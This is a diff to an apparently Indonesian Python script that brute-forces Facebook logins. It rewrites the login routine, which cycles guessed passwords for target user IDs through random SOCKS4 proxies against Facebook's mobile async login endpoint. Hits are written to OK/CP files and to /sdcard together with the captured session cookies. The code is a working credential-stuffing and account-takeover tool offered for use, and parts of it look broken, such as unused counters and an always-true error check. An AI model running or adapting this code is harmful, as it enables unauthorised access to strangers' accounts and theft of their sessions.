@@ -100,6 +100,8 @@ temanku = []
 console = Console()
 ses = requests.Session()
 lisensiku=[]
+oks = 0
+cps = 0
 def fanky():
 	console.print(f"{H2} •{U2} SCRIPT INI DALAM PERKEMBANGAN{P2} • {U2}")
 	console.print(f"{H2} •{U2} BANTU SUPPORT DENGAN FOLLO GITHUB{P2} • {U2}")
@@ -1189,9 +1191,7 @@ def setting():
     # Input untuk metode login
     hc = console.input(f" {H2}• {P2}Masukan : ").strip()
     if hc in ["1", "01"]:
-        method.append("mbasicKU")
-        metcepat()
-        return None
+        method.append("validatev1")
     #elif hc in ["2", "02"]:
         #method.append("validatev2")
     #elif hc in ["3", "03"]:
@@ -1199,9 +1199,7 @@ def setting():
     #elif hc in ["4", "04"]:
         #method.append("mbasic")
     else:
-        method.append("mbasicKU")
-        metcepat()
-        return None  # Default metode
+        method.append("validatev1")  # Default metode
 
     # Pengaturan User-Agent
     Console().print(Panel(
@@ -1329,7 +1327,7 @@ def metslow():
                 else:
                     pass
                 if "validatev1" in method:
-                    pool.submit(mbasic,idf,nmf,pwv)
+                    pool.submit(mbasic,idf,pwv)
                 #elif "validatev2" in method:
                     #pool.submit(validatev2,idf,pwv)
                 #elif "reguler" in method:
@@ -1337,7 +1335,7 @@ def metslow():
                 #elif "mbasic" in method:
                     #pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(mbasic,idf,nmf,pwv)
+                    pool.submit(mbasic,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1396,7 +1394,7 @@ def metcepat():
                         pwv.append(xpwd)
                 else:pass
                 if "validatev1" in method:
-                    pool.submit(mbasic,idf,nmf,pwv)
+                    pool.submit(mbasic,idf,pwv)
                 #elif "validatev2" in method:
                     #pool.submit(validatev2,idf,pwv)
                 #elif "reguler" in method:
@@ -1404,7 +1402,7 @@ def metcepat():
                 #elif "mbasic" in method:
                     #pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(mbasic,idf,nmf,pwv)
+                    pool.submit(mbasic,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1421,7 +1419,47 @@ def metcepat():
 
 
 #----------[ METHOD API ]----------#
-def mbasic(idf, name, pwv):
+
+def mbasic(idf, pwv):
+	global ok, cp, loop
+	bo = random.choice([m, k, h, b, u, x])
+	prog.update(des,description=f" {K2}•{H2} ASYNC {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	ua = random.choice(baru)
+	ua2 = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		nip = random.choice(prox)
+		proxs = {'http': 'socks4://' + nip}
+		link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
+		data = {'bi_xrwh': 0}
+		headers = {
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+			'viewport-width': '980'
+		}
+		po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',
+			      data=data, headers=headers, allow_redirects=False, proxies=proxs)
+		
+		if 'c_user' in ses.cookies.get_dict().keys():
+			ok += 1
+			coki = po.cookies.get_dict()
+			kuki = ';'.join([f'''{key!s}={value!s}''' for key, value in ses.cookies.get_dict().items()])
+			print(f'''{H2}[FANKY-OK] {tahun(idf)} >> \x1b[38;5;46m{idf} >> {pw}''')
+			open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
+			open('/sdcard/FANKY-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')
+		if 'checkpoint' in po.cookies.get_dict().keys():
+			print(f'''{M2} [FANKY-CP] {tahun(idf)} >> \x1b[38;5;46m{idf} >> {pw}''')
+			open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
+			open('/sdcard/FANKY-CP.txt', 'a').write(idf + ' | ' + pw + '\n')
+			akun.append(idf + '|' + pw)
+			cp += 1
+		if requests.exceptions.ConnectionError:
+			'upgrade-insecure-requests'
+			time.sleep(31)
+		loop += 1
+
+
+def mbasicgc(idf, name, pwv):
 	global loop
 	mcc = random.choice([
             'SM-F711B',
